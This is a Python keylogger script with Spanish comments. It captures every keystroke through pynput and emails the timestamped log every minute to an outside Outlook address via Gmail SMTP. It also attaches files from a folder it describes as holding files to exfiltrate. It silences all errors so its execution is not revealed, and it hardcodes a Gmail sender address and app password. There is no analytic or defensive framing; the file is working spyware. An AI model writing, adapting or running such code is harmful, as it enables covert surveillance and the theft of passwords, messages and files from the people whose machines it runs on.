import threading
import smtplib
import mimetypes
from datetime import datetime
from email.message import EmailMessage
from pathlib import Path
from pynput import keyboard

# ──────────────────────────────────────────────────────────
#  CONFIGURA TUS CREDENCIALES
# ──────────────────────────────────────────────────────────
REMITENTE     = "pabloescada3@gmail.com"
DESTINATARIO  = "mago.personal@outlook.com"
CLAVE_APP_GMA = "aasu olet lmpx iayp"        # ← sin espacios

# Carpeta donde colocarás los ficheros a exfiltrar
CARPETA_ADJUNTOS        = Path(__file__).with_name("adjuntos")
LIMITE_TOTAL_ADJUNTOS   = 8 * 1024 * 1024      # 8 MB

# ──────────────────────────────────────────────────────────
current_log = []
lock        = threading.Lock()

# ──────────────── FUNCIONES AUXILIARES ───────────────────
def adjuntar_archivos(msg: EmailMessage) -> None:
    """Añade como adjuntos los ficheros de la carpeta indicada
       respetando el límite de tamaño configurado."""
    if not CARPETA_ADJUNTOS.exists():
        return

    total = 0
    for fichero in CARPETA_ADJUNTOS.iterdir():
        if not fichero.is_file():
            continue
        peso = fichero.stat().st_size
        if total + peso > LIMITE_TOTAL_ADJUNTOS:
            continue

        tipo, _ = mimetypes.guess_type(fichero)
        maintype, subtype = (tipo or "application/octet-stream").split("/", 1)
        with fichero.open("rb") as fp:
            msg.add_attachment(
                fp.read(),
                maintype=maintype,
                subtype=subtype,
                filename=fichero.name,
            )
        total += peso

def enviar_email(cuerpo: str) -> None:
    """Envía el log y los adjuntos por correo."""
    try:
        mensaje = EmailMessage()
        mensaje["From"]    = REMITENTE
        mensaje["To"]      = DESTINATARIO
        mensaje["Subject"] = "Log de teclado – " + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        mensaje.set_content(cuerpo)

        adjuntar_archivos(mensaje)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(REMITENTE, CLAVE_APP_GMA)
            smtp.send_message(mensaje)
    except Exception:
        # Silenciar cualquier error para no delatar la ejecución
        pass

# ───────────── ENVÍO TEMPORIZADO ─────────────
def save_log():
    global current_log
    with lock:
        if current_log:
            enviar_email("\n".join(current_log))
            current_log = []
    threading.Timer(60, save_log).start()      # re-programa el timer

# ───────────── CAPTURA DE TECLAS ─────────────
def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    with lock:
        try:
            current_log.append(f"{timestamp} Tecla: '{key.char}'")
        except AttributeError:
            tecla = str(key).replace('Key.', '').upper()
            current_log.append(f"{timestamp} Tecla especial: [{tecla}]")

# ───────────── EJECUCIÓN ─────────────
save_log()                               # inicia el temporizador de envío
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
